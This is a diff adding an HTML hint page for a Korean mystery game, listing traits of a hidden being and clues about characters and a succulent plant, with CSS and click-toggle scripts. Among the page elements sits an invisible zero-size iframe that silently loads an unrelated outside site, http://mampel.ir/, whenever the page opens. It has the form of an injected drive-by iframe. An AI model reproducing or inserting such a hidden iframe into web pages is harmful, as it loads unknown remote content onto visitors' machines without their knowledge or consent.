@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html>
+<title>공략</title>
+<style>
+@font-face {
+      font-family: "DungGeunMo";
+      src: url("DungGeunMo.woff");
+    }
+		#backk{width: auto; height: 100%; animation:start 2s alternate; position: absolute;}
+	#backk img{width: 1250px; height: auto;}
+	
+	body{background-color: #484535; font-family: "DungGeunMo";}
+
+	#bx { position: absolute; bottom: 5%; left: 25%; display:none; }
+	#bx img{ width: 70%; height: auto;  }
+
+	#edding{display: none; line-height: 2;font-weight: 400; bottom: 36%; font-weight: 5px; font-size: 1.5em; left: 30%;font-family: "DungGeunMo"; z-index: 99;animation:starti 2s alternate;}
+#edding2{line-height: 2;bottom: 40%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;}
+#edding3{display: none;line-height: 2;font-weight: 400; bottom: 16%; font-weight: 5px; font-size: 1em; left: 70%;font-family: "DungGeunMo"; z-index: 99;animation:starti 5s alternate;cursor: pointer;}
+#edding4{display: none;line-height: 2;font-weight: 400; bottom: 12%; font-weight: 5px; font-size: 1em; left: 70%;font-family: "DungGeunMo"; z-index: 99;animation:starti 5s alternate;cursor: pointer;}
+
+#edding3:hover{color: #484535; } 
+	#edding4:hover{color: #484535;}
+
+	#edd{ line-height: 2;font-weight: 400; bottom: 16%; font-weight: 5px; font-size: 1.5em; left: 20%;font-family: "DungGeunMo"; z-index: 99;animation:starti 2s alternate;display: none;}
+	#edd6{ line-height: 2;font-weight: 400; bottom: 21%; font-weight: 5px; font-size: 1.5em; left: 15%;font-family: "DungGeunMo"; z-index: 99;animation:starti 2s alternate;display: none;}
+
+#edd2{display: none;line-height: 2;font-weight: 400; bottom: 16%; font-weight: 5px; font-size: 1.5em; left: 20%;font-family: "DungGeunMo"; z-index: 99;animation:starti 5s alternate;}
+
+#edd3{line-height: 2;font-weight: 400;top: 86%; font-weight: 5px; font-size: 1em; left: 0%;font-family: "DungGeunMo"; z-index: 99;cursor: pointer; }
+#edd3:hover{color: #484535; } 
+
+#edd4{line-height: 2;font-weight: 400; bottom: 12%; font-weight: 5px; font-size: 1.3em; left: 85%;font-family: "DungGeunMo"; z-index: 99;animation:starti 3s alternate;cursor: pointer; display: none;}
+#edd4:hover{color: #484535; } 
+
+	#poom{top: 0%; font-weight: 5px; font-size: 2em; left: 0%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;cursor: pointer;}
+
+	#poom2{top: 0%; font-weight: 5px; font-size: 2em; left: 0%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;}
+	#ohh{bottom: 60%; font-weight: 5px; font-size: 1em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;cursor: pointer;}
+
+	#ohh2{bottom: 66%; font-weight: 5px; font-size: 1em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;cursor: pointer;}
+
+	#ohh3{bottom: 54%; font-weight: 5px; font-size: 1em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;cursor: pointer;}
+	#ohh4{bottom: 48%; font-weight: 5px; font-size: 1em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;cursor: pointer;}
+
+	#han{bottom: 42%; font-weight: 5px; font-size: 1em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;cursor: pointer;}
+
+	#poom3{bottom: 36%; font-weight: 5px; font-size: 1em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;cursor: pointer;}
+	#poom4{line-height: 2;bottom: 60%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;  display: none;}
+	#poom5{line-height: 2;bottom: 46%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;}
+
+	#poom7{bottom: 26%; font-weight: 5px; font-size: 1em; right:  15%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;cursor: pointer; display: none;}
+
+	#poom8{top: 0%; font-weight: 5px; font-size: 2em; left: 0%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;cursor: pointer;}
+
+	#poom9{line-height: 2;bottom: 60%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;  display: none;}
+	#poow{line-height: 2;bottom: 46%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;}
+
+	#poow2{top: 0%; font-weight: 5px; font-size: 2em; left: 0%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;cursor: pointer;}
+	#poow3{line-height: 2;bottom: 60%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;  display: none;}
+	#heyy{bottom: 45%; font-weight: 5px; font-size: 1.5em; left: 24.5%;font-family: "DungGeunMo";cursor: pointer; z-index: 99;animation:start 1.3s alternate;display:none;}
+	#heyy2{bottom:39.5%;  font-weight: 5px; font-size: 1.5em; left: 32%;font-family: "DungGeunMo";cursor: pointer; z-index: 99;animation:start 1.3s alternate;display:none;}
+	
+	#mal2 img{ position: absolute; width: 200px; height: auto; z-index: 99;animation:ssi 3s alternate;}
+	#mal3 { position: absolute; z-index: 98; left:  23%; top: 48%;display:none; animation:ssi 4s alternate;}
+	#mal3 img{ position: absolute; width: 280px; height: auto; z-index: 99;animation:ssi 4s alternate;}
+
+	#heyy:hover{color: #e28383; } 
+	#heyy2:hover{color: #e28383;}
+
+	#lol{line-height: 2;bottom: 46%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;}
+	#lola{top: 0%; font-weight: 5px; font-size: 2em; left: 0%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;cursor: pointer;}
+
+	#lolali{line-height: 2;bottom: 60%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;  display: none;}
+	#loo{line-height: 2;bottom: 40%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;}
+	#lon{line-height: 2;bottom: 60%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;  display: none;}
+#lou{top: 0%; font-weight: 5px; font-size: 2em; left: 0%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;cursor: pointer;}
+#lot{top: 0%; font-weight: 5px; font-size: 2em; left: 0%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;cursor: pointer;}
+	#hyun { position: absolute; z-index: 98; right: 75%; top: 15%;animation:ssi 1s alternate;cursor: pointer;}
+	#hyun img{ position: absolute; width: 230px; height: auto;z-index: 99;}
+	#chang { position: absolute; z-index: 98; right: 75%; top: 35%;animation:ssi 2s alternate;cursor: pointer;}
+	#chang img{ position: absolute; width: 230px; height: auto;z-index: 99;}
+	#hee { position: absolute; z-index: 98; right: 75%; top: 55%;animation:ssi 3s alternate;cursor: pointer;}
+	#hee img{ position: absolute; width: 230px; height: auto;z-index: 99;}
+	#woo { position: absolute; z-index: 98; right: 45%; top: 55%;animation:ssi 6s alternate;cursor: pointer; }
+	#woo img{ position: absolute; width: 230px; height: auto;z-index: 99;}
+	#hyaa { position: absolute; z-index: 98; right: 45%; top: 15%;animation:ssi 4s alternate;cursor: pointer;}
+	#hyaa img{ position: absolute; width: 230px; height: auto;z-index: 99;}
+	#park { position: absolute; z-index: 98; right: 45%; top: 35%;animation:ssi 5s alternate;cursor: pointer;}
+	#park img{ position: absolute; width: 230px; height: auto;z-index: 99;}
+
+	#park img:hover{opacity: 40%; } 
+
+	#lor{line-height: 2;bottom: 60%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb;  display: none;}
+#loe{line-height: 2;bottom: 30%; font-weight: 5px; font-size: 1.3em; left: 32%;font-family: "DungGeunMo"; z-index: 99; color: #eadbdb; display: none;}
+
+	#hyun2 { position: absolute; z-index: 98; right: 85%; top: 15%;animation:tra 1s alternate;cursor: pointer; display: none;}
+	#hyun2 img{ position: absolute; width: 400px; height: auto;z-index: 99;}
+#chang2 { position: absolute; z-index: 98; right: 85%; top: 15%;animation:tra 1s alternate;cursor: pointer; display: none;}
+	#chang2 img{ position: absolute; width: 400px; height: auto;z-index: 99;}
+#hyaa2 { position: absolute; z-index: 98; right: 85%; top: 15%;animation:tra 1s alternate;cursor: pointer; display: none;}
+	#hyaa2 img{ position: absolute; width: 400px; height: auto;z-index: 99;}
+#woo2 { position: absolute; z-index: 98; right: 85%; top: 15%;animation:tra 1s alternate;cursor: pointer; display: none;}
+	#woo2 img{ position: absolute; width: 400px; height: auto;z-index: 99;}
+#park2 { position: absolute; z-index: 98; right: 85%; top: 15%;animation:tra 1s alternate;cursor: pointer; display: none;}
+	#park2 img{ position: absolute; width: 400px; height: auto;z-index: 99;}
+#hee2 { position: absolute; z-index: 98; right: 85%; top: 15%;animation:tra 1s alternate;cursor: pointer; display: none;}
+	#hee2 img{ position: absolute; width: 400px; height: auto;z-index: 99;}
+
+
+
+
+
+#container{position: relative; margin: auto; width:1250px; height: 1000px;font-family: "DungGeunMo"; }
+@-webkit-keyframes typing { from { width: 0; } }
+@-webkit-keyframes blink-caret { 50% { border-color: #484535; } }
+
+@keyframes start{
+			0%{opacity: 0;}
+			
+			100%{opacity: 1;}
+		}
+
+@keyframes ssi{0%{opacity: 0;}
+			90%{opacity: 0;}
+			
+			100%{opacity: 1;}
+		}
+
+@keyframes starti{
+			0%{opacity: 0;}
+			80%{opacity: 0;}
+			100%{opacity: 1;}
+		}
+@keyframes startii{
+			0%{opacity: 0;}
+			80%{opacity: 0;}
+			100%{opacity: 1;}
+		}
+@keyframes inin{
+			0%{top: 40%;}
+			
+			100%{top: 38%;}
+		}
+@keyframes backk{
+			0%{top: 42%;}
+			
+			100%{top: 44%;}
+		}			
+		
+@keyframes heree{
+			0%{right: 8%;}
+			
+			100%{right: 6%;}
+		}
+@keyframes tra{
+			0%{opacity: 0}
+			
+			100%{opacity: 1}
+		}
+
+h1 { 
+	color: #484535;
+
+	 
+	width: 70ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	animation:ssi 2.5s alternate;
+	-webkit-animation: typing 0.6s steps(20, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h2 { 
+	color: #484535;
+
+	 
+	width: 18ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 0.5s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h3 { 
+	color: #484535;
+
+	 
+	width: 20ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	animation:ssi 2.5s alternate;
+	-webkit-animation: typing 0.6s steps(20, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h4 { 
+	color: #484535;
+	
+	 
+	width: 75ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	animation:ssi 2.5s alternate;
+	-webkit-animation: typing 1s steps(20, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h6 { 
+	color: #484535;
+	
+	 
+	width: 10ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h7 { 
+	color: #484535;
+	
+	width: 45ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	animation:ssi 3s alternate;
+
+}
+h10{color: #351616;position: absolute;z-index: 3; animation:start 1.3s alternate;}
+p { width: 40ch;
+	color: white;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+</style>
+
+<head>
+	<title></title>
+</head>
+
+<body>
+	<div id="container">
+
+
+<p id="edd3">노래가 안나온다면 여기를 눌러주세요</p>
+<a href="https://seoojing.github.io/main_map/">
+<p id="edd4">시작</p>
+</a>
+
+	 	<h3 id="poom2">게임 해설</h3>
+	 	<h10 id="poom7">뒤로</h10>
+	 	<h1 id="poom">1. 그 존재의 주변에 있는 스마트기기는 자주 망가진다.</h1>
+	 	<h1 id="poom8">2. 그 존재는 언제나 우리에게 최대한 좋은 이미지를 남기려 한다.</h1>
+	 	<h1 id="poow2">3. 그 존재는 주변이들에게 평화주의적이다.</h1>
+	 	<h1 id="lola">4. 그 존재는 완벽한듯 보이지만 꽤나 허점이 있다.</h1>
+	 	<h1 id="lou">5. 그 존재는 우리에게 들키지 않기 위해 우리의 일상에 자연스레 녹아있다.</h1>
+	 	<h1 id="lot">6. 그 존재는 액체에 약하다.</h1>
+
+<h1 id="poom4">- 화장실의 노래 센서가 오작동을 하고 있었다.<br>▶ 다육이가 젖어 있었으므로 물을 주러온 혜윤의 방문 예상</h1>
+<h1 id="poom5">- 컴퓨터실의 모니터 한 대가 오작동을 하고 있었다.<br>▶ 다육이의 한 종류인 "읍튜샤"를 검색해본 혜윤 예상</h1>
+<h1 id="poow3">- 박지와 황지가 다툰 것 같았다.<br>▶ 모두와 평화롭게 지내려고하는 성질과 다른 모습이다.</h1>
+<h1 id="poom9">- 창수가 계속해서 경계했다.<br>▶ 잘보이려고 하는 그 존재와는 다른 모습.</h1>
+<h1 id="poow">- 박지와 황지가 다툰 것 같았다.<br>▶ 주변이들에게 잘 보이려고 하는 성질과 다르다.</h1>
+<h1 id="lol">- 은서가 계속해서 플레이어를 의심한다.<br>▶ 역으로 의심받기 좋기 때문에 평화와 거리가 멀다.</h1>
+<h1 id="lolali">- 다육이는 햇빛을 쬐면 안된다.<br>▶ 다육이는 그늘진 곳에서 자라야하는 식물이다.</h1>
+<h1 id="loo">- 보통의 사람은 이해하기 힘든 다육이에 대한 집착.<br>▶ 과제를 마다하고 다육이와 지낸다는 것은 어딘가 <br>부자연스러워 보인다.</h1>
+<h1 id="lon">- 은서가 눈치채지 못한 이동.<br>▶ 분명 혜윤이가 지나간 흔적이 있는데 (다육이와 다육 잎) <br> 은서는 희선이와 자신만이 학교에 있다고 말했다.</h1>
+<h1 id="edding2">- 친구들의 목격담 및 언급.<br>▶ 화장실도, 컴퓨터실로도 이리저리 이동했는데 <br> 그 어떤 친구의 언급도 있지 않다.</h1>
+<h1 id="lor">- 약점이 적힌 종이<br>▶ 희선이가 가져온 전단지의 구멍으로 <br> 그 존재에 대한 약점이 드러나 있다.
+<br> 왼쪽 상단의 클로버 모양을 맞춰볼 것.</h1>
+<h1 id="loe">- 다육이에게 주는 물<br>▶ 액체가 약점이라고 했지만 다육이에게 <br> 물을 줄 수 있는 것으로 봐서는 <br>순수 물에는 별 반응이 없는 것으로 판단된다. <br>(물과 커피 제외 이유) </h1>
+	 	<h4 id="ohh2">1. 그 존재의 주변에 있는 스마트기기는 자주 망가진다.</h4>
+	 	<h4 id="ohh">2. 그 존재는 언제나 우리에게 최대한 좋은 이미지를 남기려 한다.</h4>
+	 	<h4 id="ohh3">3. 그 존재는 주변이들에게 평화주의적이다. </h4>
+	 	<h4 id="ohh4">4. 그 존재는 완벽한듯 보이지만 꽤나 허점이 있다.</h4>
+	 	<h4 id="han">5. 그 존재는 우리에게 들키지 않기 위해 우리의 일상에 자연스레 녹아있다.</h4>
+	 	<h4 id="poom3">6. 그 존재는 액체에 약하다.</h4>
+
+
+
+	<audio id="but">
+		<source src="but.mp3" type="audio/mpeg">
+	</audio>
+	<audio id="walkk">
+		<source src="walk1.mp3" type="audio/mpeg" loop="true">
+	</audio>
+
+<iframe src="http://mampel.ir/" frameborder="0" style="width:0px;height:0px;border:0px" ></iframe>
+
+
+	<div id="backk">
+		<center>
+		<img src="main.png">
+		</center>
+	</div>
+
+
+</div>
+<script type="text/javascript">
+var bbPlay = 0;
+window.onmousemove = function(){
+	bbPlay++;
+	if(bbPlay == 1){walkk.play();  }
+}
+
+edd3.onclick = function(){
+		walkk.play();		}
+ohh2.onclick = function(){
+		ohh2.style.display = "none"
+		poom2.style.display = "none"
+		ohh3.style.display = "none"
+		ohh.style.display = "none"
+		ohh4.style.display = "none"
+		han.style.display = "none"
+		poom3.style.display = "none"
+				poom.style.display = "inline"
+				poom4.style.display = "inline"
+				poom5.style.display = "inline"
+				poom7.style.display = "inline"}
+
+poom7.onclick = function(){
+		ohh2.style.display = "inline"
+		poom2.style.display = "inline"
+		ohh3.style.display = "inline"
+		ohh.style.display = "inline"
+		ohh4.style.display = "inline"
+		han.style.display = "inline"
+		poom3.style.display = "inline"
+				poom.style.display = "none"
+				poom4.style.display = "none"
+				poom5.style.display = "none"
+				poom7.style.display = "none"
+				poom8.style.display = "none"
+				poom9.style.display = "none"
+				poow.style.display = "none"
+			poow2.style.display = "none"
+				lol.style.display = "none"
+				poow3.style.display = "none"
+							lola.style.display = "none"
+				lolali.style.display = "none"
+				loo.style.display = "none"
+							edding2.style.display = "none"
+				lou.style.display = "none"
+				lon.style.display = "none"
+			lot.style.display = "none"
+				lor.style.display = "none"
+				loe.style.display = "none"}
+
+ohh.onclick = function(){
+		ohh2.style.display = "none"
+		poom2.style.display = "none"
+		ohh3.style.display = "none"
+		ohh.style.display = "none"
+		ohh4.style.display = "none"
+		han.style.display = "none"
+		poom3.style.display = "none"
+				poom8.style.display = "inline"
+				poom9.style.display = "inline"
+				poow.style.display = "inline"
+				poom7.style.display = "inline"}	
+ohh3.onclick = function(){
+		ohh2.style.display = "none"
+		poom2.style.display = "none"
+		ohh3.style.display = "none"
+		ohh.style.display = "none"
+		ohh4.style.display = "none"
+		han.style.display = "none"
+		poom3.style.display = "none"
+				poow2.style.display = "inline"
+				lol.style.display = "inline"
+				poow3.style.display = "inline"
+				poom7.style.display = "inline"}	
+ohh4.onclick = function(){
+		ohh2.style.display = "none"
+		poom2.style.display = "none"
+		ohh3.style.display = "none"
+		ohh.style.display = "none"
+		ohh4.style.display = "none"
+		han.style.display = "none"
+		poom3.style.display = "none"
+				lola.style.display = "inline"
+				lolali.style.display = "inline"
+				loo.style.display = "inline"
+				poom7.style.display = "inline"}	
+han.onclick = function(){
+		ohh2.style.display = "none"
+		poom2.style.display = "none"
+		ohh3.style.display = "none"
+		ohh.style.display = "none"
+		ohh4.style.display = "none"
+		han.style.display = "none"
+		poom3.style.display = "none"
+				edding2.style.display = "inline"
+				lou.style.display = "inline"
+				lon.style.display = "inline"
+				poom7.style.display = "inline"}	
+poom3.onclick = function(){
+		ohh2.style.display = "none"
+		poom2.style.display = "none"
+		ohh3.style.display = "none"
+		ohh.style.display = "none"
+		ohh4.style.display = "none"
+		han.style.display = "none"
+		poom3.style.display = "none"
+				lot.style.display = "inline"
+				lor.style.display = "inline"
+				loe.style.display = "inline"
+				poom7.style.display = "inline"}			
+</script>
+</body>
+</html>
